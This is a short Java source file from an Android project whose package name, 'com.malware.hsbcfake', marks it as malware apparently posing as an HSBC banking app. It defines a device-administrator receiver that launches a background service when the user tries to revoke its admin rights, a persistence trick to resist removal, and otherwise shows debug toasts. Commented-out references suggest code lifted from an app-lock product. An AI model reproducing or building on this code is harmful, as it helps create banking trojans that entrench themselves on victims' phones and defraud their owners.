package com.malware.hsbcfake;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
//import com.domobile.applock.fz;
//import com.domobile.applock.service.LockService;
import android.widget.Toast;

public class AppLockDeviceAdminReceiver
  extends DeviceAdminReceiver
{
  public CharSequence onDisableRequested(Context paramContext, Intent paramIntent)
  {
    paramContext.startService(new Intent(paramContext, HelloIntentService.class));
    return paramContext.getString(2131296492);
  }
  
  public void onDisabled(Context paramContext, Intent paramIntent)
  {
    super.onDisabled(paramContext, paramIntent);
    Toast.makeText(paramContext, "DISABLED Recive", Toast.LENGTH_SHORT).show();
//    fz.n(paramContext, "com.domobile.elock.ACTION_DEVICE_ADMIN_STATUS_CHENGED");
  }
  
  public void onEnabled(Context paramContext, Intent paramIntent)
  {
    super.onEnabled(paramContext, paramIntent);
    Toast.makeText(paramContext, "ENABLED Recive", Toast.LENGTH_SHORT).show();
//    fz.n(paramContext, "com.domobile.elock.ACTION_DEVICE_ADMIN_STATUS_CHENGED");
  }
}